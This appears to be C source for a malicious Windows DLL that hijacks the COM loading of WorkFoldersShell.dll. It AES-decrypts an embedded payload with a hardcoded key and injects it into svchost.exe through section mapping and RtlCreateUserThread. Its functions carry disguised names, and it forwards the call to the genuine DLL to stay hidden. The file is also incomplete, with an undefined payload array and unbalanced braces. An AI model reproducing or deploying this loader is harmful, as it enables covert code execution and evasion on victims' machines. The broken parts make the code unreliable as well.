#include <winternl.h>
#include <Windows.h>
#include <combaseapi.h>
#include "helpers.h"
#include <stdio.h>
#include <Psapi.h>
#include <shlwapi.h>
#define UNICODE
#include <tlhelp32.h>
#include <wincrypt.h>
#include "helpers.h"
#include <Wininet.h>
#include <tchar.h>
#include "secure.h"


#pragma comment(lib, "psapi.lib")
#pragma comment(lib, "wininet.lib")
#pragma comment (lib, "crypt32.lib")
#pragma comment (lib, "advapi32")
#pragma comment(lib, "Shlwapi.lib")



typedef HMODULE (WINAPI * LoadLibraryA_t)(LPCSTR lpLibFileName);
typedef BOOL (WINAPI * CreateProcessA_t)(LPCSTR lpApplicationName,LPSTR lpCommandLine, LPSECURITY_ATTRIBUTES lpProcessAttributes, LPSECURITY_ATTRIBUTES lpThreadAttributes,BOOL bInheritHandles, DWORD dwCreationFlags,LPVOID  lpEnvironment,LPCSTR  lpCurrentDirectory,LPSTARTUPINFOA lpStartupInfo,LPPROCESS_INFORMATION lpProcessInformation);

typedef HRESULT(WINAPI * tDllGetClassObject)(REFCLSID rclsid, REFIID riid, LPVOID* ppv);
tDllGetClassObject pDllGetClassObject;

typedef HANDLE (WINAPI * OpenProcess_t)(
 DWORD dwDesiredAccess,
 BOOL  bInheritHandle,
 DWORD dwProcessId
);

typedef NTSTATUS (NTAPI * NtGetNextProcess_t)(
	_In_ HANDLE ProcessHandle,
	_In_ ACCESS_MASK DesiredAccess,
	_In_ ULONG HandleAttributes,
	_In_ ULONG Flags,
	_Out_ PHANDLE NewProcessHandle
	);

typedef struct _CLIENT_ID {
	HANDLE UniqueProcess;
	HANDLE UniqueThread;
} CLIENT_ID, *PCLIENT_ID;

typedef LPVOID (WINAPI * VirtualAlloc_t)(
	LPVOID lpAddress,
	SIZE_T dwSize,
	DWORD  flAllocationType,
	DWORD  flProtect);
	
typedef VOID (WINAPI * RtlMoveMemory_t)(
	VOID UNALIGNED *Destination, 
	const VOID UNALIGNED *Source, 
	SIZE_T Length);

typedef FARPROC (WINAPI * RtlCreateUserThread_t)(
	IN HANDLE ProcessHandle,
	IN PSECURITY_DESCRIPTOR SecurityDescriptor OPTIONAL,
	IN BOOLEAN CreateSuspended,
	IN ULONG StackZeroBits,
	IN OUT PULONG StackReserved,
	IN OUT PULONG StackCommit,
	IN PVOID StartAddress,
	IN PVOID StartParameter OPTIONAL,
	OUT PHANDLE ThreadHandle,
	OUT PCLIENT_ID ClientId);

typedef NTSTATUS (NTAPI * NtCreateThreadEx_t)(
	OUT PHANDLE hThread,
	IN ACCESS_MASK DesiredAccess,
	IN PVOID ObjectAttributes,
	IN HANDLE ProcessHandle,
	IN PVOID lpStartAddress,
	IN PVOID lpParameter,
	IN ULONG Flags,
	IN SIZE_T StackZeroBits,
	IN SIZE_T SizeOfStackCommit,
	IN SIZE_T SizeOfStackReserve,
	OUT PVOID lpBytesBuffer);

typedef struct _UNICODE_STRING {
	USHORT Length;
	USHORT MaximumLength;
	_Field_size_bytes_part_(MaximumLength, Length) PWCH Buffer;
} UNICODE_STRING, *PUNICODE_STRING;

typedef struct _OBJECT_ATTRIBUTES {
	ULONG Length;
	HANDLE RootDirectory;
	PUNICODE_STRING ObjectName;
	ULONG Attributes;
	PVOID SecurityDescriptor; // PSECURITY_DESCRIPTOR;
	PVOID SecurityQualityOfService; // PSECURITY_QUALITY_OF_SERVICE
} OBJECT_ATTRIBUTES, *POBJECT_ATTRIBUTES;

	typedef NTSTATUS (NTAPI * NtCreateSection_t)(
	OUT PHANDLE SectionHandle,
	IN ULONG DesiredAccess,
	IN POBJECT_ATTRIBUTES ObjectAttributes OPTIONAL,
	IN PLARGE_INTEGER MaximumSize OPTIONAL,
	IN ULONG PageAttributess,
	IN ULONG SectionAttributes,
	IN HANDLE FileHandle OPTIONAL); 

typedef NTSTATUS (NTAPI * NtMapViewOfSection_t)(
	HANDLE SectionHandle,
	HANDLE ProcessHandle,
	PVOID * BaseAddress,
	ULONG_PTR ZeroBits,
	SIZE_T CommitSize,
	PLARGE_INTEGER SectionOffset,
	PSIZE_T ViewSize,
	DWORD InheritDisposition,
	ULONG AllocationType,
	ULONG Win32Protect);
	
typedef enum _SECTION_INHERIT {
	ViewShare = 1,
	ViewUnmap = 2
} SECTION_INHERIT, *PSECTION_INHERIT;	

typedef BOOL (WINAPI * VirtualProtect_t)(
 LPVOID lpAddress,
 SIZE_T dwSize,
 DWORD  flNewProtect,
 PDWORD lpflOldProtect
);

typedef BOOL (WINAPI * WriteProcessMemory_t)(
HANDLE  hProcess,
LPVOID  lpBaseAddress,
LPCVOID lpBuffer,
SIZE_T  nSize,
SIZE_T* lpNumberOfBytesWritten
);


typedef HMODULE (WINAPI * LoadLibraryA_t)(LPCSTR lpLibFileName
);

typedef LPVOID (WINAPI * VirtualAlloc_t)(LPVOID lpAddress,SIZE_T dwSize,DWORD  flAllocationType,DWORD  flProtect);


unsigned char key[] =  { 0x85, 0xfe, 0x73, 0x48, 0x47, 0xfb, 0xfe, 0xbe, 0x3, 0x3, 0x6a, 0x7d, 0x52, 0xdd, 0x46, 0x36 };
int reload_len = sizeof(reload);

int VisualCode(char * reload, unsigned int reload_len, char * key, size_t keylen) {
	HCRYPTPROV hProv;
	HCRYPTHASH hHash;
	HCRYPTKEY hKey;

	if (!CryptAcquireContextW(&hProv, NULL, NULL, PROV_RSA_AES, CRYPT_VERIFYCONTEXT)){
			return -1;
	}
	if (!CryptCreateHash(hProv, CALG_SHA_256, 0, 0, &hHash)){
			return -1;
	}
	if (!CryptHashData(hHash, (BYTE*) key, (DWORD) keylen, 0)){
			return -1;              
	}
	if (!CryptDeriveKey(hProv, CALG_AES_256, hHash, 0,&hKey)){
			return -1;
	}
	
	if (!CryptDecrypt(hKey, (HCRYPTHASH) NULL, 0, 0, (BYTE *) reload, (DWORD *) &reload_len)){
			return -1;
	}
	
	CryptReleaseContext(hProv, 0);
	CryptDestroyHash(hHash);
	CryptDestroyKey(hKey);
	
	return 0;
}

int VisualFind(const wchar_t* procname) {
    int pid = 0;
    HANDLE currentProc = NULL;
    wchar_t procNameTemp[MAX_PATH];

    NtGetNextProcess_t pNtGetNextProcess = (NtGetNextProcess_t)hlpGetProcAddress(hlpGetModuleHandle(L"NTDLL.DLL"), "NtGetNextProcess");

    while (!pNtGetNextProcess(currentProc, MAXIMUM_ALLOWED, 0, 0, &currentProc)) {
        GetProcessImageFileNameW(currentProc, procNameTemp, MAX_PATH);
 
        if (lstrcmpiW(procname, PathFindFileNameW(procNameTemp)) == 0) {
            pid = GetProcessId(currentProc);
            break;
        }
    }

    return pid;
}



int ReviewVIEW(HANDLE hProc,int pid,unsigned char * reload, unsigned int reload_len) {

	HANDLE hSection = NULL;
	PVOID pLocalView = NULL, pRemoteView = NULL;
	HANDLE hThread = NULL;
	CLIENT_ID cid;

	
	
	NtCreateSection_t pNtCreateSection = (NtCreateSection_t)hlpGetProcAddress(hlpGetModuleHandle(L"NTDLL.DLL"), "NtCreateSection");
			
	if (pNtCreateSection == NULL)
		return -2;
	
	
	pNtCreateSection(&hSection, SECTION_ALL_ACCESS, NULL, (PLARGE_INTEGER) &reload_len, PAGE_EXECUTE_READWRITE, SEC_COMMIT, NULL);

	NtMapViewOfSection_t pNtMapViewOfSection = (NtMapViewOfSection_t)hlpGetProcAddress(hlpGetModuleHandle(L"NTDLL.DLL"), "NtMapViewOfSection");
	
	if (pNtMapViewOfSection == NULL)
		return -2;
	
	pNtMapViewOfSection(hSection, GetCurrentProcess(), &pLocalView, NULL, NULL, NULL, (SIZE_T *) &reload_len, ViewUnmap, NULL, PAGE_READWRITE);

	memcpy(pLocalView, reload, reload_len);
	
	pNtMapViewOfSection(hSection, hProc, &pRemoteView, NULL, NULL, NULL, (SIZE_T *) &reload_len, ViewUnmap, NULL, PAGE_EXECUTE_READ);
		
	RtlCreateUserThread_t pRtlCreateUserThread = (RtlCreateUserThread_t)hlpGetProcAddress(hlpGetModuleHandle(L"NTDLL.DLL"),"RtlCreateUserThread");
		
	if (pRtlCreateUserThread == NULL)
		return -2;
	pRtlCreateUserThread(hProc, NULL, FALSE, 0, 0, 0, pRemoteView, 0, &hThread, &cid);
	if (hThread != NULL) {
			WaitForSingleObject(hThread, 500);
			CloseHandle(hThread);
			return 0;
	}
	return -1;
}


HRESULT STDAPI DllGetClassObject(REFCLSID rclsid,
								 REFIID riid,
								 LPVOID FAR* ppv) { 
	STARTUPINFO info={sizeof(info)};
    PROCESS_INFORMATION processInfo;
	HMODULE hOrigDLL;
	
	// uses external functions to resolve Process names
	CreateProcessA_t pCreateProcessA = (CreateProcessA_t) hlpGetProcAddress(hlpGetModuleHandle(L"KERNEL32.DLL"), "CreateProcessA");
	LoadLibraryA_t pLoadLibraryA = (LoadLibraryA_t) hlpGetProcAddress(hlpGetModuleHandle(L"KERNEL32.DLL"), "LoadLibrary");
	
	
	/**
	// Add your path to the binary on the disk?
	pCreateProcessA(
				"C:\\Users\\private\\Desktop\\NewRoz\\Code\\share.exe", 
				"", NULL, NULL, TRUE, 0, NULL, NULL, 
				&info, &processInfo);
	
	*/

	int pid  = VisualFind(L"svchost.exe");

	HANDLE hProc = NULL;
	
	if (pid) {

	 	OpenProcess_t pOpenProcess = (OpenProcess_t)hlpGetProcAddress(hlpGetModuleHandle(L"KERNEL32.DLL")," OpenProcess");

		hProc = OpenProcess( PROCESS_CREATE_THREAD | PROCESS_QUERY_INFORMATION | 
						PROCESS_VM_OPERATION | PROCESS_VM_READ | PROCESS_VM_WRITE,
						FALSE, (DWORD) pid);

		if (hProc != NULL) {
			VisualCode((char *) reload, reload_len, (char *) key, sizeof(key));
			ReviewVIEW(hProc,pid,reload,reload_len);
			CloseHandle(hProc);
		
	// run the original DLL and continue.
	hOrigDLL = pLoadLibraryA("C:\\Windows\\System32\\WorkFoldersShell.dll");
	pDllGetClassObject = (tDllGetClassObject) GetProcAddress(hOrigDLL, "DllGetClassObject");
	if (!pDllGetClassObject)
		return S_FALSE;
	
	HRESULT hRes = pDllGetClassObject(rclsid, riid, ppv);
	
	return hRes;
} 

	}

								 }